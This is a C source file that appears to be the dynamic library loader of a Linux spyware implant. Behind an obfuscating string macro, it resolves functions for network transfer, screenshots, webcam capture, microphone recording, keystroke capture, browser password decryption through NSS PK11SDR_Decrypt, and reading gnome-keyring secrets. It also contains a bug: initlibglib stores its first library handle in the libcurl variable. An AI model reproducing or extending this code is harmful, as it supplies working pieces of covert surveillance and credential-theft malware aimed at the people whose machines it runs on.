#define _GNU_SOURCE
#include <dlfcn.h>
#include <pthread.h>

#include "runtime.h"
#include "info.h"
#include "config.h"
#include "so.h"
#include "me.h"

static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

static int initlibcurl(void);
static int initlibjpeg(void);
static int initlibv4l2(void);
static int initlibsqlite3(void);
static int initlibXi(void);
static int initlibcrypto(void);
static int initlibnss3(void);
static int initlibXss(void);
static int initlibX11(void);
static int initlibglib(void);
static int initlibgnomekeyring(void);
static int initlibpulse(void);
static int initlibspeex(void);

static void *libcurl = NULL;
static void *libjpeg = NULL;
static void *libv4l2 = NULL;
static void *libsqlite3 = NULL;
static void *libXi = NULL;
static void *libcrypto = NULL;
static void *libnss3 = NULL;
static void *libXss = NULL;
static void *libX11 = NULL;
static void *libglib = NULL;
static void *libgnomekeyring = NULL;
static void *libpulse = NULL;
static void *libspeex = NULL;

int initlib(unsigned int lib)
{
   int ret = -1;

   pthread_mutex_lock(&mutex);

   do {
      if((lib & INIT_LIBCURL) && !libcurl) if((ret = initlibcurl())) break;
      if((lib & INIT_LIBJPEG) && !libjpeg) if((ret = initlibjpeg())) break;
      if((lib & INIT_LIBV4L2) && !libv4l2) if((ret = initlibv4l2())) break;
      if((lib & INIT_LIBSQLITE3) && !libsqlite3) if((ret = initlibsqlite3())) break;
      if((lib & INIT_LIBXI) && !libXi) if((ret = initlibXi())) break;
      if((lib & INIT_LIBCRYPTO) && !libcrypto) if((ret = initlibcrypto())) break;
      if((lib & INIT_LIBNSS3) && !libnss3) if((ret = initlibnss3())) break;
      if((lib & INIT_LIBXSS) && !libXss) if((ret = initlibXss())) break;
      if((lib & INIT_LIBX11) && !libX11) if((ret = initlibX11())) break;
      if((lib & INIT_LIBGLIB) && !libglib) if((ret = initlibglib())) break;
      if((lib & INIT_LIBGNOMEKEYRING) && !libgnomekeyring) if((ret = initlibgnomekeyring())) break;
      if((lib & INIT_LIBPULSE) && !libpulse) if((ret = initlibpulse())) break;
      if((lib & INIT_LIBSPEEX) && !libspeex) if((ret = initlibspeex())) break;
      ret = 0;
   } while(0);

   pthread_mutex_unlock(&mutex);

   return ret;
}

static int initlibcurl(void)
{
   int ret = -1;

   do {
      if((libcurl = dlopen(SO"./libcurl.so", RTLD_NOW))) {}
      else if((libcurl = dlopen(SO"libcurl.so.4", RTLD_NOW))) {}
      else if((libcurl = dlopen(SO"libcurl-gnutls.so.4", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_curl_global_init) = dlsym(libcurl, SO"curl_global_init"))) break;
      if(!(*(void **)(&P_curl_easy_init) = dlsym(libcurl, SO"curl_easy_init"))) break;
      if(!(*(void **)(&P_curl_slist_append) = dlsym(libcurl, SO"curl_slist_append"))) break;
      if(!(*(void **)(&P_curl_easy_setopt) = dlsym(libcurl, SO"curl_easy_setopt"))) break;
      if(!(*(void **)(&P_curl_easy_cleanup) = dlsym(libcurl, SO"curl_easy_cleanup"))) break;
      if(!(*(void **)(&P_curl_slist_free_all) = dlsym(libcurl, SO"curl_slist_free_all"))) break;
      if(!(*(void **)(&P_curl_easy_perform) = dlsym(libcurl, SO"curl_easy_perform"))) break;
      debugme("RUNTIME libcurl loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libcurl) { dlclose(libcurl); libcurl = NULL; }
      debugme("RUNTIME failed to load libcurl\n");
   }

   return ret;
}

static int initlibjpeg(void)
{
   int ret = -1;

   do {
      if((libjpeg = dlopen(SO"./libjpeg.so", RTLD_NOW))) {}
      else if((libjpeg = dlopen(SO"libjpeg.so.8", RTLD_NOW))) {}
      else if((libjpeg = dlopen(SO"libjpeg.so.62", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_jpeg_std_error) = dlsym(libjpeg, SO"jpeg_std_error"))) break;
      if(!(*(void **)(&P_jpeg_CreateCompress) = dlsym(libjpeg, SO"jpeg_CreateCompress"))) break;
      if(!(*(void **)(&P_jpeg_stdio_dest) = dlsym(libjpeg, SO"jpeg_stdio_dest"))) break;
      if(!(*(void **)(&P_jpeg_set_defaults) = dlsym(libjpeg, SO"jpeg_set_defaults"))) break;
      if(!(*(void **)(&P_jpeg_set_quality) = dlsym(libjpeg, SO"jpeg_set_quality"))) break;
      if(!(*(void **)(&P_jpeg_start_compress) = dlsym(libjpeg, SO"jpeg_start_compress"))) break;
      if(!(*(void **)(&P_jpeg_write_scanlines) = dlsym(libjpeg, SO"jpeg_write_scanlines"))) break;
      if(!(*(void **)(&P_jpeg_finish_compress) = dlsym(libjpeg, SO"jpeg_finish_compress"))) break;
      if(!(*(void **)(&P_jpeg_destroy_compress) = dlsym(libjpeg, SO"jpeg_destroy_compress"))) break;
      jpeg_libver = dlsym(libjpeg, SO"jpeg_mem_dest") ? (dlvsym(libjpeg, SO"jpeg_mem_dest", SO"LIBJPEGTURBO_6.2") ? 62 : 80) : 62;
      debugme("RUNTIME libjpeg loaded (version %d.%d)\n", jpeg_libver / 10, jpeg_libver % 10);
      ret = 0;
   } while(0);

   if(ret) {
      if(libjpeg) { dlclose(libjpeg); libjpeg = NULL; }
      debugme("RUNTIME failed to load libjpeg\n");
   }

   return ret;
}

static int initlibv4l2(void)
{
   int ret = -1;

   do {
      if((libv4l2 = dlopen(SO"./libv4l2.so", RTLD_NOW))) {}
      else if((libv4l2 = dlopen(SO"libv4l2.so.0", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_v4l2_open) = dlsym(libv4l2, SO"v4l2_open"))) break;
      if(!(*(void **)(&P_v4l2_close) = dlsym(libv4l2, SO"v4l2_close"))) break;
      if(!(*(void **)(&P_v4l2_ioctl) = dlsym(libv4l2, SO"v4l2_ioctl"))) break;
      if(!(*(void **)(&P_v4l2_mmap) = dlsym(libv4l2, SO"v4l2_mmap"))) break;
      if(!(*(void **)(&P_v4l2_munmap) = dlsym(libv4l2, SO"v4l2_munmap"))) break;
      debugme("RUNTIME libv4l2 loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libv4l2) { dlclose(libv4l2); libv4l2 = NULL; }
      debugme("RUNTIME failed to load libv4l2\n");
   }

   return ret;
}

static int initlibsqlite3(void)
{
   int ret = -1;

   do {
      if((libsqlite3 = dlopen(SO"./libsqlite3.so", RTLD_NOW))) {}
      else if((libsqlite3 = dlopen(SO"libsqlite3.so.0", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_sqlite3_bind_int) = dlsym(libsqlite3, SO"sqlite3_bind_int"))) break;
      if(!(*(void **)(&P_sqlite3_close) = dlsym(libsqlite3, SO"sqlite3_close"))) break;
      if(!(*(void **)(&P_sqlite3_column_int) = dlsym(libsqlite3, SO"sqlite3_column_int"))) break;
      if(!(*(void **)(&P_sqlite3_column_text) = dlsym(libsqlite3, SO"sqlite3_column_text"))) break;
      if(!(*(void **)(&P_sqlite3_exec) = dlsym(libsqlite3, SO"sqlite3_exec"))) break;
      if(!(*(void **)(&P_sqlite3_finalize) = dlsym(libsqlite3, SO"sqlite3_finalize"))) break;
      if(!(*(void **)(&P_sqlite3_open) = dlsym(libsqlite3, SO"sqlite3_open"))) break;
      if(!(*(void **)(&P_sqlite3_prepare_v2) = dlsym(libsqlite3, SO"sqlite3_prepare_v2"))) break;
      if(!(*(void **)(&P_sqlite3_step) = dlsym(libsqlite3, SO"sqlite3_step"))) break;
      debugme("RUNTIME libsqlite3 loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libsqlite3) { dlclose(libsqlite3); libsqlite3 = NULL; }
      debugme("RUNTIME failed to load libsqlite3\n");
   }

   return ret;
}

static int initlibXi(void)
{
   int ret = -1;

   do {
      if((libXi = dlopen(SO"./libXi.so", RTLD_NOW))) {}
      else if((libXi = dlopen(SO"libXi.so.6", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_XOpenDevice) = dlsym(libXi, SO"XOpenDevice"))) break;
      if(!(*(void **)(&P_XListInputDevices) = dlsym(libXi, SO"XListInputDevices"))) break;
      if(!(*(void **)(&P_XSelectExtensionEvent) = dlsym(libXi, SO"XSelectExtensionEvent"))) break;
      if(!(*(void **)(&P_XCloseDevice) = dlsym(libXi, SO"XCloseDevice"))) break;
      if(!(*(void **)(&P_XFreeDeviceList) = dlsym(libXi, SO"XFreeDeviceList"))) break;
      debugme("RUNTIME libXi loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libXi) { dlclose(libXi); libXi = NULL; }
      debugme("RUNTIME failed to load libXi\n");
   }

   return ret;
}

static int initlibcrypto(void)
{
   int ret = -1;

   do {
      if((libcrypto = dlopen(SO"./libcrypto.so", RTLD_NOW))) {}
      else if((libcrypto = dlopen(SO"libcrypto.so.1.0.0", RTLD_NOW))) {}
      else if((libcrypto = dlopen(SO"libcrypto.so.10", RTLD_NOW))) {}
      else if((libcrypto = dlopen(SO"libcrypto.so.0.9.8", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_BIO_ctrl) = dlsym(libcrypto, SO"BIO_ctrl"))) break;
      if(!(*(void **)(&P_BIO_f_cipher) = dlsym(libcrypto, SO"BIO_f_cipher"))) break;
      if(!(*(void **)(&P_BIO_f_md) = dlsym(libcrypto, SO"BIO_f_md"))) break;
      if(!(*(void **)(&P_BIO_free) = dlsym(libcrypto, SO"BIO_free"))) break;
      if(!(*(void **)(&P_BIO_free_all) = dlsym(libcrypto, SO"BIO_free_all"))) break;
      if(!(*(void **)(&P_BIO_gets) = dlsym(libcrypto, SO"BIO_gets"))) break;
      if(!(*(void **)(&P_BIO_new) = dlsym(libcrypto, SO"BIO_new"))) break;
      if(!(*(void **)(&P_BIO_new_file) = dlsym(libcrypto, SO"BIO_new_file"))) break;
      if(!(*(void **)(&P_BIO_new_fp) = dlsym(libcrypto, SO"BIO_new_fp"))) break;
      if(!(*(void **)(&P_BIO_pop) = dlsym(libcrypto, SO"BIO_pop"))) break;
      if(!(*(void **)(&P_BIO_printf) = dlsym(libcrypto, SO"BIO_printf"))) break;
      if(!(*(void **)(&P_BIO_push) = dlsym(libcrypto, SO"BIO_push"))) break;
      if(!(*(void **)(&P_BIO_read) = dlsym(libcrypto, SO"BIO_read"))) break;
      if(!(*(void **)(&P_BIO_set_cipher) = dlsym(libcrypto, SO"BIO_set_cipher"))) break;
      if(!(*(void **)(&P_BIO_s_mem) = dlsym(libcrypto, SO"BIO_s_mem"))) break;
      if(!(*(void **)(&P_BIO_s_null) = dlsym(libcrypto, SO"BIO_s_null"))) break;
      if(!(*(void **)(&P_BIO_write) = dlsym(libcrypto, SO"BIO_write"))) break;
      if(!(*(void **)(&P_BIO_puts) = dlsym(libcrypto, SO"BIO_puts"))) break;
      if(!(*(void **)(&P_EVP_CIPHER_CTX_set_padding) = dlsym(libcrypto, SO"EVP_CIPHER_CTX_set_padding"))) break;
      if(!(*(void **)(&P_EVP_get_cipherbyname) = dlsym(libcrypto, SO"EVP_get_cipherbyname"))) break;
      if(!(*(void **)(&P_EVP_sha1) = dlsym(libcrypto, SO"EVP_sha1"))) break;
      if(!(*(void **)(&P_MD5) = dlsym(libcrypto, SO"MD5"))) break;
      if(!(*(void **)(&P_OpenSSL_add_all_ciphers) = dlsym(libcrypto, SO"OpenSSL_add_all_ciphers"))) break;
      if(!(*(void **)(&P_RAND_pseudo_bytes) = dlsym(libcrypto, SO"RAND_pseudo_bytes"))) break;
      if(!(*(void **)(&P_SHA1_Final) = dlsym(libcrypto, SO"SHA1_Final"))) break;
      if(!(*(void **)(&P_SHA1_Init) = dlsym(libcrypto, SO"SHA1_Init"))) break;
      if(!(*(void **)(&P_SHA1_Update) = dlsym(libcrypto, SO"SHA1_Update"))) break;
      debugme("RUNTIME libcrypto loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libcrypto) { dlclose(libcrypto); libcrypto = NULL; }
      debugme("RUNTIME failed to load libcrypto\n");
   }

   return ret;
}

static int initlibnss3(void)
{
   int ret = -1;

   do {
      if((libnss3 = dlopen(SO"./libnss3.so", RTLD_NOW))) {}
      else if((libnss3 = dlopen(SO"libnss3.so", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_NSS_Init) = dlsym(libnss3, SO"NSS_Init"))) break;
      if(!(*(void **)(&P_NSS_Shutdown) = dlsym(libnss3, SO"NSS_Shutdown"))) break;
      if(!(*(void **)(&P_NSSBase64_DecodeBuffer) = dlsym(libnss3, SO"NSSBase64_DecodeBuffer"))) break;
      if(!(*(void **)(&P_SECITEM_ZfreeItem) = dlsym(libnss3, SO"SECITEM_ZfreeItem"))) break;
      if(!(*(void **)(&P_PK11SDR_Decrypt) = dlsym(libnss3, SO"PK11SDR_Decrypt"))) break;
      debugme("RUNTIME libnss3 loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libnss3) { dlclose(libnss3); libnss3 = NULL; }
      debugme("RUNTIME failed to load libnss3\n");
   }

   return ret;
}

static int initlibXss(void)
{
   int ret = -1;

   do {
      if((libXss = dlopen(SO"./libXss.so", RTLD_NOW))) {}
      else if((libXss = dlopen(SO"libXss.so.1", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_XScreenSaverQueryExtension) = dlsym(libXss, SO"XScreenSaverQueryExtension"))) break;
      if(!(*(void **)(&P_XScreenSaverQueryInfo) = dlsym(libXss, SO"XScreenSaverQueryInfo"))) break;
      debugme("RUNTIME libXss loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libXss) { dlclose(libXss); libXss = NULL; }
      debugme("RUNTIME failed to load libXss\n");
   }

   return ret;
}

static int initlibX11(void)
{
   int ret = -1;

   do {
      if((libX11 = dlopen(SO"./libX11.so", RTLD_NOW))) {}
      else if((libX11 = dlopen(SO"libX11.so.6", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_XCloseDisplay) = dlsym(libX11, SO"XCloseDisplay"))) break;
      if(!(*(void **)(&P_XCloseIM) = dlsym(libX11, SO"XCloseIM"))) break;
      if(!(*(void **)(&P_XCreateIC) = dlsym(libX11, SO"XCreateIC"))) break;
      if(!(*(void **)(&P_XDestroyIC) = dlsym(libX11, SO"XDestroyIC"))) break;
      if(!(*(void **)(&P_XFlush) = dlsym(libX11, SO"XFlush"))) break;
      if(!(*(void **)(&P_XFree) = dlsym(libX11, SO"XFree"))) break;
      if(!(*(void **)(&P_XGetImage) = dlsym(libX11, SO"XGetImage"))) break;
      if(!(*(void **)(&P_XGetInputFocus) = dlsym(libX11, SO"XGetInputFocus"))) break;
      if(!(*(void **)(&P_XGetWindowAttributes) = dlsym(libX11, SO"XGetWindowAttributes"))) break;
      if(!(*(void **)(&P_XGetWindowProperty) = dlsym(libX11, SO"XGetWindowProperty"))) break;
      if(!(*(void **)(&P_XInitThreads) = dlsym(libX11, SO"XInitThreads"))) break;
      if(!(*(void **)(&P_XInternAtom) = dlsym(libX11, SO"XInternAtom"))) break;
      if(!(*(void **)(&P_XNextEvent) = dlsym(libX11, SO"XNextEvent"))) break;
      if(!(*(void **)(&P_XOpenDisplay) = dlsym(libX11, SO"XOpenDisplay"))) break;
      if(!(*(void **)(&P_XOpenIM) = dlsym(libX11, SO"XOpenIM"))) break;
      if(!(*(void **)(&P_XPending) = dlsym(libX11, SO"XPending"))) break;
      if(!(*(void **)(&P_XQueryPointer) = dlsym(libX11, SO"XQueryPointer"))) break;
      if(!(*(void **)(&P_XQueryTree) = dlsym(libX11, SO"XQueryTree"))) break;
      if(!(*(void **)(&P_XSetErrorHandler) = dlsym(libX11, SO"XSetErrorHandler"))) break;
      if(!(*(void **)(&P_XSetIOErrorHandler) = dlsym(libX11, SO"XSetIOErrorHandler"))) break;
      if(!(*(void **)(&P_Xutf8LookupString) = dlsym(libX11, SO"Xutf8LookupString"))) break;
      debugme("RUNTIME libX11 loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libX11) { dlclose(libX11); libX11 = NULL; }
      debugme("RUNTIME failed to load libX11\n");
   }

   return ret;
}

static int initlibglib(void)
{
   int ret = -1;

   do {
      if((libcurl = dlopen(SO"./libglib.so", RTLD_NOW))) {}
      else if((libglib = dlopen(SO"libglib-2.0.so.0", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_g_list_free) = dlsym(libglib, SO"g_list_free"))) break;
      debugme("RUNTIME libglib loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libglib) { dlclose(libglib); libglib = NULL; }
      debugme("RUNTIME failed to load libglib\n");
   }

   return ret;
}

static int initlibgnomekeyring(void)
{
   int ret = -1;

   do {
      if((libgnomekeyring = dlopen(SO"./libgnome-keyring.so", RTLD_NOW))) {}
      else if((libgnomekeyring = dlopen(SO"libgnome-keyring.so.0", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_gnome_keyring_attribute_list_free) = dlsym(libgnomekeyring, SO"gnome_keyring_attribute_list_free"))) break;
      if(!(*(void **)(&P_gnome_keyring_get_info_sync) = dlsym(libgnomekeyring, SO"gnome_keyring_get_info_sync"))) break;
      if(!(*(void **)(&P_gnome_keyring_info_free) = dlsym(libgnomekeyring, SO"gnome_keyring_info_free"))) break;
      if(!(*(void **)(&P_gnome_keyring_info_get_is_locked) = dlsym(libgnomekeyring, SO"gnome_keyring_info_get_is_locked"))) break;
      if(!(*(void **)(&P_gnome_keyring_is_available) = dlsym(libgnomekeyring, SO"gnome_keyring_is_available"))) break;
      if(!(*(void **)(&P_gnome_keyring_item_get_attributes_sync) = dlsym(libgnomekeyring, SO"gnome_keyring_item_get_attributes_sync"))) break;
      if(!(*(void **)(&P_gnome_keyring_item_get_info_sync) = dlsym(libgnomekeyring, SO"gnome_keyring_item_get_info_sync"))) break;
      if(!(*(void **)(&P_gnome_keyring_item_info_free) = dlsym(libgnomekeyring, SO"gnome_keyring_item_info_free"))) break;
      if(!(*(void **)(&P_gnome_keyring_item_info_get_mtime) = dlsym(libgnomekeyring, SO"gnome_keyring_item_info_get_mtime"))) break;
      if(!(*(void **)(&P_gnome_keyring_item_info_get_secret) = dlsym(libgnomekeyring, SO"gnome_keyring_item_info_get_secret"))) break;
      if(!(*(void **)(&P_gnome_keyring_list_item_ids_sync) = dlsym(libgnomekeyring, SO"gnome_keyring_list_item_ids_sync"))) break;
      if(!(*(void **)(&P_gnome_keyring_list_keyring_names_sync) = dlsym(libgnomekeyring, SO"gnome_keyring_list_keyring_names_sync"))) break;
      if(!(*(void **)(&P_gnome_keyring_string_list_free) = dlsym(libgnomekeyring, SO"gnome_keyring_string_list_free"))) break;
      debugme("RUNTIME libgnomekeyring loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libgnomekeyring) { dlclose(libgnomekeyring); libgnomekeyring = NULL; }
      debugme("RUNTIME failed to load libgnomekeyring\n");
   }

   return ret;
}

static int initlibpulse(void)
{
   int ret = -1;

   do {
      if((libpulse = dlopen(SO"./libpulse-simple.so", RTLD_NOW))) {}
      else if((libpulse = dlopen(SO"libpulse-simple.so.0", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_pa_simple_free) = dlsym(libpulse, SO"pa_simple_free"))) break;
      if(!(*(void **)(&P_pa_simple_new) = dlsym(libpulse, SO"pa_simple_new"))) break;
      if(!(*(void **)(&P_pa_simple_read) = dlsym(libpulse, SO"pa_simple_read"))) break;
      debugme("RUNTIME libpulse loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libpulse) { dlclose(libpulse); libpulse = NULL; }
      debugme("RUNTIME failed to load libpulse\n");
   }

   return ret;
}

static int initlibspeex(void)
{
   int ret = -1;

   do {
      if((libspeex = dlopen(SO"./libspeex.so", RTLD_NOW))) {}
      else if((libspeex = dlopen(SO"libspeex.so.1", RTLD_NOW))) {}
      else return ret;

      if(!(*(void **)(&P_speex_bits_destroy) = dlsym(libspeex, SO"speex_bits_destroy"))) break;
      if(!(*(void **)(&P_speex_bits_init) = dlsym(libspeex, SO"speex_bits_init"))) break;
      if(!(*(void **)(&P_speex_bits_reset) = dlsym(libspeex, SO"speex_bits_reset"))) break;
      if(!(*(void **)(&P_speex_bits_write) = dlsym(libspeex, SO"speex_bits_write"))) break;
      if(!(*(void **)(&P_speex_encode_int) = dlsym(libspeex, SO"speex_encode_int"))) break;
      if(!(*(void **)(&P_speex_encoder_ctl) = dlsym(libspeex, SO"speex_encoder_ctl"))) break;
      if(!(*(void **)(&P_speex_encoder_destroy) = dlsym(libspeex, SO"speex_encoder_destroy"))) break;
      if(!(*(void **)(&P_speex_encoder_init) = dlsym(libspeex, SO"speex_encoder_init"))) break;
      if(!(*(void **)(&P_speex_lib_get_mode) = dlsym(libspeex, SO"speex_lib_get_mode"))) break;
      debugme("RUNTIME libspeex loaded\n");
      ret = 0;
   } while(0);

   if(ret) {
      if(libspeex) { dlclose(libspeex); libspeex = NULL; }
      debugme("RUNTIME failed to load libspeex\n");
   }

   return ret;
}
